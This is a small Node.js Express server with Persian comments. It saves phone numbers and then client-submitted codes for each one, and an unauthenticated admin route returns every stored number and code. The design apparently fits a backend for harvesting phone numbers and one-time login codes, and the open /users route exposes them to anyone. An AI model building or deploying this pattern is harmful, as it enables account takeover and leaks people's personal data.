const express = require("express");
const cors = require("cors");
const mongoose = require("mongoose");

const app = express();

app.use(cors());
app.use(express.json());

// اتصال به MongoDB
mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log("MongoDB Connected"))
  .catch(err => console.log(err));

// مدل کاربر
const UserSchema = new mongoose.Schema({
  phone: String,
  code: String
});

const User = mongoose.model("User", UserSchema);

// ذخیره شماره
app.post("/phone", async (req, res) => {
  const { phone } = req.body;

  const user = await User.create({
    phone,
    code: ""
  });

  res.json({ id: user._id });
});

// ذخیره کد
app.put("/code/:id", async (req, res) => {
  const { id } = req.params;
  const { code } = req.body;

  const user = await User.findById(id);

  if (!user) {
    return res.status(404).json({ error: "not found" });
  }

  user.code = code;
  await user.save();

  res.json({ ok: true });
});

// دیدن همه کاربران (ادمین)
app.get("/users", async (req, res) => {
  const users = await User.find();
  res.json(users);
});

app.get("/", (req, res) => {
  res.send("Server is running");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running");
});